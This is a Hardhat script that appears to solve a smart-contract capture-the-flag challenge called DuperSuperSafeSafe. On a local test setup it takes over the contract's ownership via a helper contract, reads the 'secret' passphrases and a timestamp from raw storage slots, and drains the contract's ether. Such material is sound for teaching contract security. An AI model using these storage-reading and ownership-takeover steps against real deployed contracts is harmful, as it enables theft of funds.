const { ethers } = require("hardhat");
const { expect } = require("chai");
const { storageAt, getBalance } = require("./utils/helpers.js");
const abiCoder = ethers.utils.defaultAbiCoder;

async function deployContract(deployer) {
  // DuperSuperSafeSafe contract constructor inputs
  let amountOfEth = ethers.utils.parseUnits("5", "ether");
  let secret1 = ethers.utils.formatBytes32String("abcd");
  let secret2 = ethers.utils.formatBytes32String("efgh");

  // Deploy
  const DuperSuper = await ethers.getContractFactory(
    "contracts/DuperSuperSafeSafe.sol:DuperSuperSafeSafe",
    deployer
  );
  const duperSuper = await DuperSuper.deploy(secret1, secret2, {
    value: amountOfEth,
  });
  return [duperSuper];
}

async function main() {
  console.log("CHALLENGE 1 - DuperSuperSafeSafe \n");

  let [deployer, challenger] = await ethers.getSigners();
  let [duperSuper] = await deployContract(deployer);

  // Checking if challenge is solved by calling 'isSolved' DuperSuperSafeSafe function
  expect(await duperSuper.isSolved()).to.be.false;

  console.log(
    "Initial status of the challenge. Is challenge solved?:",
    await duperSuper.isSolved(),
    "\n"
  );

  console.log(
    "Initial balance of the challenge contract:",
    await getBalance(duperSuper.address),
    "ETH\n"
  );

  // Changing owner of DuperSuperSafeSafe: deployer address => challenger address. Transaction must be send from contract.
  const ChangeOwner = await ethers.getContractFactory(
    "DuperChangeOwner",
    challenger
  );
  await ChangeOwner.deploy(duperSuper.address, challenger.address);

  // Computing locations where mapping values (secret passphrases) lie: location in storage = keccak256(mappingKey, mappingSlot)
  const encodedLocation1 = abiCoder.encode(["uint256", "uint256"], [0, 1]);
  const encodedLocation2 = abiCoder.encode(["uint256", "uint256"], [1, 1]);
  const storageSlot1 = ethers.utils.keccak256(encodedLocation1);
  const storageSlot2 = ethers.utils.keccak256(encodedLocation2);
  const secretValue1 = await storageAt(duperSuper.address, storageSlot1);
  const secretValue2 = await storageAt(duperSuper.address, storageSlot2);

  // Timestamp value. Third storage slot
  const timestamp = ethers.BigNumber.from(
    await storageAt(duperSuper.address, 2)
  );

  // Withdrawing all ETH from DuperSuperSafeSafe
  const duperSuperBalance = await duperSuper.balanceOf(duperSuper.address);
  await duperSuper
    .connect(challenger)
    .withdrawFunds(duperSuperBalance, secretValue1, secretValue2, timestamp);

  expect(await duperSuper.isSolved()).to.be.true;
  console.log(
    "Final status of the challenge. Is challenge solved?:",
    await duperSuper.isSolved(),
    "\n"
  );
  console.log(
    "Final balance of the challenge contract:",
    await getBalance(duperSuper.address),
    "ETH\n"
  );
}

main();
